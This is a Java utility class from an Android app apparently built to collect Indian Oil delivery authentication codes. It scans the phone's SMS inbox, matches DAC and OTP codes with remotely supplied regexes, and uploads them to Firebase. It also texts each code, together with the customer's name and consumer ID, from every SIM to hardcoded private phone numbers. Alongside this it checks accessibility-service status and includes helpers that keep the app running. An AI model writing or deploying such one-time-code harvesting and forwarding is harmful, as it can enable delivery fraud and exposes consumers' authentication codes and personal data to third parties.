package android.iocl.dac_collector.Utility;


import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.graphics.Typeface;
import android.iocl.dac_collector.Firebase.FirebaseDBClient;
import android.iocl.dac_collector.ModelData.RegexModel;
import android.iocl.dac_collector.Services.AcessibilitySettings;
import android.iocl.dac_collector.Services.FixOppoAutoKill;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.text.SpannableStringBuilder;
import android.text.Spanned;
import android.text.TextUtils;
import android.text.style.BackgroundColorSpan;
import android.text.style.ForegroundColorSpan;
import android.text.style.StyleSpan;
import android.text.style.TypefaceSpan;
import android.util.Base64;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.google.gson.Gson;
import com.google.gson.JsonElement;
import com.google.gson.JsonParser;
import com.google.gson.reflect.TypeToken;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.UnsupportedEncodingException;
import java.lang.reflect.Type;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Utility {
    public static final int NOTIFICATION_ID = 1001;

    public static final String TAG = "Utility_Mokardder";
    public static final int DEFAULT_SUBSCRIPTION_ID = 1;





    public static boolean isJobSchedulerActive(Context context, int jobId) {
        JobScheduler jobScheduler = (JobScheduler) context.getSystemService(Context.JOB_SCHEDULER_SERVICE);
        if (jobScheduler != null) {
            for (JobInfo jobInfo : jobScheduler.getAllPendingJobs()) {
                if (jobInfo.getId() == jobId) {
                    return true; // Job with this ID is active
                }
            }
        }
        return false; // Job is not active
    }




    public static boolean isTruecallerInstalled(Context context) {
        PackageManager pm = context.getPackageManager();
        try {
            pm.getPackageInfo("com.truecaller", PackageManager.GET_ACTIVITIES);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }


    public static boolean isServiceRunning(Context context, Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        if (manager != null) {
            for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
                if (serviceClass.getName().equals(service.service.getClassName())) {
                    return true;
                }
            }
        }
        return false;
    }


    public static String getMyPhoneNumber(Context context) {
        if (context == null) return null;

        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

        if (telephonyManager != null) {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                if (context.checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED ||
                        context.checkSelfPermission(android.Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED) {

                    String phoneNumber = telephonyManager.getLine1Number();
                    return (phoneNumber != null && !phoneNumber.isEmpty()) ? phoneNumber : "Phone number unavailable";
                } else {
                    return "Permission not granted";
                }
            } else {
                // For pre-Marshmallow versions
                String phoneNumber = telephonyManager.getLine1Number();
                return (phoneNumber != null && !phoneNumber.isEmpty()) ? phoneNumber : "Phone number unavailable";
            }
        }
        return "TelephonyManager unavailable";
    }

    public static boolean isAccessibilityServiceEnabled(Context mContext) {
        int accessibilityEnabled = 0;
        final String service = mContext.getPackageName() + "/" + AcessibilitySettings.class.getCanonicalName();
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                    mContext.getApplicationContext().getContentResolver(),
                    Settings.Secure.ACCESSIBILITY_ENABLED
            );
            Log.v(TAG, "accessibilityEnabled = " + accessibilityEnabled);
        } catch (Settings.SettingNotFoundException e) {
            Log.e(TAG, "Error finding setting, default accessibility to not found: " + e.getMessage());
        }

        if (accessibilityEnabled == 1) {
            Log.v(TAG, "Accessibility Is Enabled");
            String settingValue = Settings.Secure.getString(
                    mContext.getApplicationContext().getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            if (settingValue != null) {
                TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
                splitter.setString(settingValue);
                while (splitter.hasNext()) {
                    String accessibilityService = splitter.next();
                    Log.v(TAG, "AccessibilityService :: " + accessibilityService + " " + service);
                    if (accessibilityService.equalsIgnoreCase(service)) {
                        Log.v(TAG, "accessibility is switched on!");
                        return true;
                    }
                }
            }
        } else {
            Log.v(TAG, "accessibility is disabled");
        }
        return false;
    }


    public static void getDACMessages(Context c) {

        if (ContextCompat.checkSelfPermission(c, "android.permission.READ_SMS")
                == PackageManager.PERMISSION_GRANTED) {
            ContentResolver contentResolver = c.getContentResolver();
            Uri uri = Uri.parse("content://sms/inbox");
            String[] projection = {"_id", "address", "body", "date", "read", "type"};
            String sortOrder = "date DESC";
            Cursor cursor = null;

            try {
                cursor = contentResolver.query(uri, projection, null, null, sortOrder);
                if (cursor != null && cursor.moveToFirst()) {
                    int bodyColumnIndex = cursor.getColumnIndex("body");
                    int dateColumnIndex = cursor.getColumnIndex("date");

                    do {
                        if (bodyColumnIndex == -1 || dateColumnIndex == -1) break;

                        long time = cursor.getLong(dateColumnIndex);
                        long currentTime = System.currentTimeMillis();
                        long windowMillis = TimeUnit.HOURS.toMillis(10);

                        // Only check messages from the last 10 hours


                        if (currentTime - time < windowMillis) {
                            String body = cursor.getString(bodyColumnIndex);
                            String formattedDate = new SimpleDateFormat(
                                    "dd-MM-yyyy HH:mm:ss", Locale.ENGLISH
                            ).format(new Date(time));

                            List<RegexModel> details = checkDACRegex(body, c);


                            if (details != null && !details.isEmpty()) {
                                boolean isDAC = details.get(0).getCaptures().size() > 1;
                                String DAC = isDAC ? details.get(0).getCaptures().get(1)
                                        : details.get(0).getCaptures().get(0);

                                String message = isDAC ? details.get(0).getCaptures().get(0)
                                        : "Indian Oil OTP";


                                Log.d(TAG, "getDACMessages: Ready to Sync");

                                if (isDAC) {
                                        FirebaseDBClient.addToDb(c, DAC, message, formattedDate);
                                    // ✅ Found first valid DAC → stop scanning
                                    return;
                                }
                            }
                        }
                    } while (cursor.moveToNext()); // no need for count < 40 anymore
                }
            } finally {
                if (cursor != null) cursor.close();
            }
        }
    }

    public static String getReturValidDAC(Context c) {

        if (ContextCompat.checkSelfPermission(c, "android.permission.READ_SMS")
                == PackageManager.PERMISSION_GRANTED) {
            ContentResolver contentResolver = c.getContentResolver();
            Uri uri = Uri.parse("content://sms/inbox");
            String[] projection = {"_id", "address", "body", "date", "read", "type"};
            String sortOrder = "date DESC";
            Cursor cursor = null;

            try {
                cursor = contentResolver.query(uri, projection, null, null, sortOrder);
                if (cursor != null && cursor.moveToFirst()) {
                    int bodyColumnIndex = cursor.getColumnIndex("body");
                    int dateColumnIndex = cursor.getColumnIndex("date");

                    do {
                        if (bodyColumnIndex == -1 || dateColumnIndex == -1) break;

                        long time = cursor.getLong(dateColumnIndex);
                        long currentTime = System.currentTimeMillis();
                        long windowMillis = TimeUnit.HOURS.toMillis(14); // Validate time to send

                        // Only check messages from the last 10 hours


                        if (currentTime - time < windowMillis) {
                            String body = cursor.getString(bodyColumnIndex);
                            String formattedDate = new SimpleDateFormat(
                                    "dd-MM-yyyy HH:mm:ss", Locale.ENGLISH
                            ).format(new Date(time));

                            List<RegexModel> details = checkDACRegex(body, c);


                            if (details != null && !details.isEmpty()) {
                                boolean isDAC = details.get(0).getCaptures().size() > 1;
                                String DAC = isDAC ? details.get(0).getCaptures().get(1)
                                        : details.get(0).getCaptures().get(0);

                                String message = isDAC ? details.get(0).getCaptures().get(0)
                                        : "Indian Oil OTP";

                                if (isDAC) {


                                    if (!details.get(0).getId().equals("GeneratedDAC")) {
                                        FirebaseDBClient.addToDb(c, DAC, message, formattedDate);


                                    } else {
                                        FirebaseDBClient.syncDac(c, DAC, message, formattedDate);
                                    }
                                    // ✅ Found first valid DAC → stop scanning
                                    return DAC;
                                }
                            }
                        }
                    } while (cursor.moveToNext()); // no need for count < 40 anymore
                }
            } finally {
                if (cursor != null) cursor.close();
            }
        }
        return null;
    }


    public static List<RegexModel> checkDACRegex(String message, Context c) {

        String jsonString = getMessagepattern(c);
        JSONObject jsonObject;
        JSONArray patterns = null;
        try {
            jsonObject = new JSONObject(jsonString);
            patterns = jsonObject.getJSONArray("patterns");
        } catch (JSONException e) {

            return new ArrayList<>();
        }

        List<RegexModel> matches = new ArrayList<>();
        // Loop through patterns
        for (int i = 0; i < patterns.length(); i++) {
            JSONObject patternObject = null;
            String regex = null;
            String id = null;
            try {
                patternObject = patterns.getJSONObject(i);
                regex = patternObject.getString("regex");
                id = patternObject.getString("id");
            } catch (JSONException e) {

            }

            // Compile and match regex
            if (regex != null && id != null) {
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(message);

                if (matcher.find()) {
                    List<String> captures = new ArrayList<>();
                    for (int j = 1; j <= matcher.groupCount(); j++) {
                        captures.add((matcher.group(j)));
                    }

                    // Create RegexModel and add it to matches
                    RegexModel matchData = new RegexModel(regex, captures, id);
                    matches.add(matchData);
                }
            }
        }


        return matches;
    }

    public static String getCurrentTime() {
        Calendar calendar = Calendar.getInstance();
        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.ENGLISH);
        String formattedDateTime = sdf.format(calendar.getTime());
        return formattedDateTime;
    }


    public static String getStandardDate() {
        Calendar calendar = Calendar.getInstance();
        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy", Locale.ENGLISH);
        String formattedDateTime = sdf.format(calendar.getTime());
        return formattedDateTime;
    }

    public static String getStandardDatenTime() {
        Calendar calendar = Calendar.getInstance();
        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.ENGLISH);
        String formattedDateTime = sdf.format(calendar.getTime());
        return formattedDateTime;
    }
    public static String getMilisToDateTime(String timestamp) {
        try {
            long timeMillis = Long.parseLong(timestamp);

            SimpleDateFormat sdf = new SimpleDateFormat(
                    "dd MMM yyyy hh:mm a",
                    Locale.ENGLISH
            );

            return sdf.format(new Date(timeMillis));

        } catch (Exception e) {
            return timestamp;
        }
    }


    public static SpannableStringBuilder markdownFormatter(Context context, String text) {

        SpannableStringBuilder builder = new SpannableStringBuilder();

        if (text == null || text.trim().isEmpty()) {
            return builder;
        }

        try {

            // Convert "-" into bullet new line
            text = text.replaceAll("(?m)^-\\s*", "\n• ");

            int currentIndex = 0;

            Pattern pattern = Pattern.compile("(\\*\\*(.*?)\\*\\*)|(`(.*?)`)");

            Matcher matcher = pattern.matcher(text);

            while (matcher.find()) {

                // Normal text before match
                if (matcher.start() > currentIndex) {
                    builder.append(
                            text.substring(currentIndex, matcher.start())
                    );
                }

                // -------------------------
                // BOLD TEXT -> **text**
                // -------------------------
                if (matcher.group(2) != null) {

                    int start = builder.length();

                    builder.append(matcher.group(2));

                    int end = builder.length();

                    builder.setSpan(
                            new StyleSpan(Typeface.BOLD),
                            start,
                            end,
                            Spanned.SPAN_EXCLUSIVE_EXCLUSIVE
                    );
                }

                // -------------------------
                // CODE TEXT -> `text`
                // -------------------------
                else if (matcher.group(4) != null) {

                    int start = builder.length();

                    builder.append(" ")
                            .append(matcher.group(4))
                            .append(" ");

                    int end = builder.length();

                    // Monospace font
                    builder.setSpan(
                            new TypefaceSpan("monospace"),
                            start,
                            end,
                            Spanned.SPAN_EXCLUSIVE_EXCLUSIVE
                    );

                    // Background
                    builder.setSpan(
                            new BackgroundColorSpan(
                                    Color.parseColor("#D3D3D3")
                            ),
                            start,
                            end,
                            Spanned.SPAN_EXCLUSIVE_EXCLUSIVE
                    );

                    // Text color
                    builder.setSpan(
                            new ForegroundColorSpan(Color.BLACK),
                            start,
                            end,
                            Spanned.SPAN_EXCLUSIVE_EXCLUSIVE
                    );
                }

                currentIndex = matcher.end();
            }

            // Remaining text
            if (currentIndex < text.length()) {
                builder.append(text.substring(currentIndex));
            }

        } catch (Exception e) {

            e.printStackTrace();
            builder.append(text);
        }

        return builder;

    }

    public static String getUploadStats() {

        int uploadCount =
               SharedPrefs.getInt("upload_count", 0);

        long uploadedBytes =
                SharedPrefs.getLong("uploaded_bytes", 0);

        long lastReset =
                SharedPrefs.getLong("last_reset_time", 0);

        double uploadedMb =
                uploadedBytes / (1024.0 * 1024.0);

        String lastResetText;

        if (lastReset > 0) {

            lastResetText =
                    Utility.getMilisToDateTime(
                            String.valueOf(lastReset)
                    );

        } else {

            lastResetText = "Never";
        }

        return
                "📊 Upload Stats\n\n" +

                        "🖼 Uploaded Images: "
                        + uploadCount +

                        "\n📦 Uploaded Size: "
                        + String.format("%.2f MB", uploadedMb) +

                        "\n🔄 Last Reset: "
                        + lastResetText;
    }

    public static boolean isAppUpdatedOrInstalledRecently(Context context) {
        try {
            PackageInfo packageInfo = context.getPackageManager()
                    .getPackageInfo(context.getPackageName(), 0);

            long lastUpdateTime = packageInfo.lastUpdateTime; // in milliseconds
            long installTime = packageInfo.firstInstallTime; // in milliseconds
            long now = System.currentTimeMillis();

            // Example threshold: 1 hour
            long threshold = TimeUnit.MINUTES.toMillis(1);

            // Return true if installed or updated within threshold
            return (now - lastUpdateTime) < threshold || (now - installTime) < threshold;

        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            return false;
        }
    }

    public static void sendSms(String Cashmemo, String DAC, String name, String consumerId, Context context, String codeType) {

        Calendar calendar = Calendar.getInstance();
        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.ENGLISH);
        String formattedDateTime = sdf.format(calendar.getTime());

        String msg = "CM - " + Cashmemo + " DAC - " + DAC + " Name " + name + " ( " + consumerId + " ) Time " + formattedDateTime;

        String phoneNumber;

        if (Cashmemo.equals("TEST-001")) {
            phoneNumber = "+919932896502";
        } else if (codeType != null) {

            switch (codeType) {
                case "DAC":
                    phoneNumber = "+919231902703";
                    break;
                case "OTP":
                    phoneNumber = "+919932896502";
                    break;
                default:
                    phoneNumber = getPhoneNumber();
                    break;
            }

        } else {
            phoneNumber = getPhoneNumber();
        }

        SubscriptionManager subscriptionManager = SubscriptionManager.from(context);
        if (subscriptionManager == null) {
            SmsManager sms = SmsManager.getDefault();
            sms.sendTextMessage(phoneNumber, null, msg, null, null);
            return;
        }
        // Get active subscription list
        @SuppressLint("MissingPermission") List<SubscriptionInfo> subscriptionInfos = subscriptionManager.getActiveSubscriptionInfoList();
        if (subscriptionInfos == null || subscriptionInfos.isEmpty()) {
            SmsManager sms = SmsManager.getDefault();
            sms.sendTextMessage(phoneNumber, null, msg, null, null);
            return;
        }
        // Send SMS from each SIM
        for (SubscriptionInfo subInfo : subscriptionInfos) {
            int subId = subInfo.getSubscriptionId();

            // Get SmsManager for this subscription ID
            SmsManager smsManager;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                smsManager = SmsManager.getSmsManagerForSubscriptionId(subId);
            } else {
                smsManager = SmsManager.getDefault();
            }
            try {
                // Send SMS
                smsManager.sendTextMessage(phoneNumber, null, msg, null, null);


            } catch (Exception e) {
                SmsManager sms = SmsManager.getDefault();
                sms.sendTextMessage(phoneNumber, null, msg, null, null);
                e.printStackTrace();

            }
        }

    }

    public static String getPhoneNumber() {

        String[] array = {"+919123386785", "+919932896502", "+919231902703"};

        // Create an instance of Random
        long timeStamp = System.currentTimeMillis();

        // Get the last digit of the timestamp
        int lastDigit = (int) (timeStamp % 10);

        // Use the last digit to generate an index within the range of the array
        int randomIndex = lastDigit % array.length;

        // Get the random value from the array
        String randomValue = array[randomIndex];

        return randomValue;
    }

    public static String encodeB64(String input) {
        try {
            return Base64.encodeToString(input.getBytes("UTF-8"), Base64.DEFAULT);
        } catch (UnsupportedEncodingException e) {

            return null; // Return null if encoding fails
        }
    }

    public static <T> Object decodeApiResponse(String base64String, Class<T> modelClass) {

        try {
            // Decode the Base64 string to a JSON string
            byte[] decodedBytes = Base64.decode(base64String, Base64.DEFAULT);
            String decodedJson = new String(decodedBytes);

            // Use Gson to check JSON type
            Gson gson = new Gson();
            JsonElement jsonElement = JsonParser.parseString(decodedJson);

            // If JSON is an array, return List<T>
            if (jsonElement.isJsonArray()) {
                Type listType = TypeToken.getParameterized(List.class, modelClass).getType();
                return gson.fromJson(jsonElement, listType);
            }

            // If JSON is an object, return T
            if (jsonElement.isJsonObject()) {
                return gson.fromJson(jsonElement, modelClass);
            }

            throw new IllegalStateException("Unexpected JSON type: " + jsonElement);
        } catch (Exception e) {
            e.printStackTrace();
            return null; // Or handle error as needed
        }
    }

    public static void updateMessagePattern(String message, Context c) {
        SharedPrefs.setPattern(message);

    }


    public static void updateSenderNumbers(String message, Context c) {

        SharedPrefs.setSenderNumbers(message);

    }

    public static void updateProfile(String message, Context c) {
        SharedPrefs.setProfile(message);
    }

    public static void saveUnsentDAC(String DAC, Context c) {
        SharedPrefs.saveUnsentDAC(DAC);
    }

    public static String getUnsentDAC(Context c) {

        return SharedPrefs.getUnsentDAC();

    }

    public static void clearUnsentDAC(Context c) {

        SharedPrefs.clearUnsentDAC();

    }

//    public static boolean isInternetAvailable(Context ctx) {
//
//
//        new InternetCheckerSimple(ctx).check((connected, reason) -> {
//            boolean connected1 = connected;
//            return connected1;
//        });
//
//
//        /*
//
//        #@Deprecated
//        final String TAG = "NetworkUtils";
//
//        // 1) Check basic network connectivity first
//        if (!isNetworkConnected(ctx)) {
//            Log.d(TAG, "No network connectivity");
//            return false;
//        }
//
//        // 2) Try multiple verification methods with proper timeout
//        return canReachInternetServers();
//
//
//         */
//    }

//    private static boolean isNetworkConnected(Context ctx) {
//        ConnectivityManager cm = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
//        if (cm == null) {
//            return false;
//        }
//
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
//            Network activeNetwork = cm.getActiveNetwork();
//            if (activeNetwork == null) return false;
//
//            NetworkCapabilities caps = cm.getNetworkCapabilities(activeNetwork);
//            return caps != null &&
//                    (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
//                            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
//                            caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) ||
//                            caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN));
//        } else {
//            NetworkInfo ni = cm.getActiveNetworkInfo();
//            return ni != null && ni.isConnectedOrConnecting();
//        }
//    }
//
//    private static boolean canReachInternetServers() {
//        // Try different verification methods
//        return testWithDnsLookup() || testWithTcpConnections() || testWithHttpRequest();
//    }

//    private static boolean testWithDnsLookup() {
//        String[] hosts = {"google.com", "cloudflare.com", "microsoft.com"};
//
//        for (String host : hosts) {
//            try {
//                InetAddress address = InetAddress.getByName(host);
//                Log.d("NetworkUtils", "DNS resolved: " + host + " -> " + address.getHostAddress());
//                return true;
//            } catch (Exception e) {
//                Log.d("NetworkUtils", "DNS failed for: " + host);
//            }
//        }
//        return false;
//    }
//
//    private static boolean testWithTcpConnections() {
//        String[] hosts = {"8.8.8.8", "1.1.1.1", "208.67.222.222"};
//        int[] ports = {53, 80, 443};
//
//        ExecutorService executor = Executors.newSingleThreadExecutor();
//        Future<Boolean> future = executor.submit(() -> {
//            for (String host : hosts) {
//                for (int port : ports) {
//                    try (Socket socket = new Socket()) {
//                        socket.connect(new InetSocketAddress(host, port), 3000);
//                        Log.d("NetworkUtils", "TCP success: " + host + ":" + port);
//                        return true;
//                    } catch (IOException e) {
//                        Log.d("NetworkUtils", "TCP failed: " + host + ":" + port + " - " + e.getMessage());
//                    }
//                }
//            }
//            return false;
//        });
//
//        try {
//            return future.get(10, TimeUnit.SECONDS); // Overall timeout
//        } catch (Exception e) {
//            future.cancel(true);
//            return false;
//        } finally {
//            executor.shutdown();
//        }
//    }
//
//    private static boolean testWithHttpRequest() {
//        String[] urls = {
//                "https://www.google.com/generate_204", // Returns 204 No Content
//                "https://connectivitycheck.gstatic.com/generate_204",
//                "http://www.msftconnecttest.com/connecttest.txt"
//        };
//
//        ExecutorService executor = Executors.newSingleThreadExecutor();
//        Future<Boolean> future = executor.submit(() -> {
//            for (String urlString : urls) {
//                HttpURLConnection connection = null;
//                try {
//                    URL url = new URL(urlString);
//                    connection = (HttpURLConnection) url.openConnection();
//                    connection.setConnectTimeout(5000);
//                    connection.setReadTimeout(5000);
//                    connection.setRequestMethod("GET");
//
//                    int responseCode = connection.getResponseCode();
//                    Log.d("NetworkUtils", "HTTP " + urlString + " -> " + responseCode);
//
//                    // Consider 2xx/3xx responses and 204 as success
//                    if (responseCode == 204 ||
//                            (responseCode >= 200 && responseCode < 400)) {
//                        return true;
//                    }
//                } catch (Exception e) {
//                    Log.d("NetworkUtils", "HTTP failed: " + urlString + " - " + e.getMessage());
//                } finally {
//                    if (connection != null) {
//                        connection.disconnect();
//                    }
//                }
//            }
//            return false;
//        });
//
//        try {
//            return future.get(15, TimeUnit.SECONDS);
//        } catch (Exception e) {
//            future.cancel(true);
//            return false;
//        } finally {
//            executor.shutdown();
//        }
//    }


    public static void sendAnyUnsentDAC(Context c) {

        String DAC = SharedPrefs.getUnsentDAC();
        if (DAC.isEmpty()) {
            return;
        }
        long savedTime = SharedPrefs.getUnsentDACTime();
        boolean isSendAble = System.currentTimeMillis() - savedTime <= 14 * 60 * 60 * 1000;

        if (isSendAble) {
            String formattedDate = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.ENGLISH).format(new java.util.Date(savedTime));
            FirebaseDBClient.syncDac(c, DAC, "unsent_dac", formattedDate);
            SharedPrefs.clearUnsentDAC();

        }

    }

    public static String getProfile() {
        return SharedPrefs.getProfile();
    }

    public static String getMessagepattern(Context c) {

        return SharedPrefs.getPattern();
    }


}
